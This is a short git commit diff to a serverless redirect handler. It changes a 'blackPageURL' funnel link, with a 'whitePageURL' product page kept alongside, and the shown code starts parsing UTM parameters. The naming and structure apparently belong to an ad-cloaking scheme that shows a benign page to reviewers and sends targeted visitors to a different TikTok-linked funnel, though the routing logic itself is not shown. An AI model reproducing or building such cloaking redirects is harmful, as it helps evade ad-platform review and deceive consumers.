db7607cfea58693a72c15fc08e9aabdda405994a
s4-glitchy <s4alicreator001@gmail.com>
2025-02-04 21:30:29 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
     const whitePageURL = "https://www.fruugobahrain.com/pink-heart-watermelon-t-shirt-cool-summer-stylehfuihi290/p-299430890-670371355?language=en";
-    const blackPageURL = "https://YAbHewMyUM.myfunnelish.com/tiktok-1231sdf";
+    const blackPageURL = "https://YAbHewMyUM.myfunnelish.com/tiktok-vote123";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
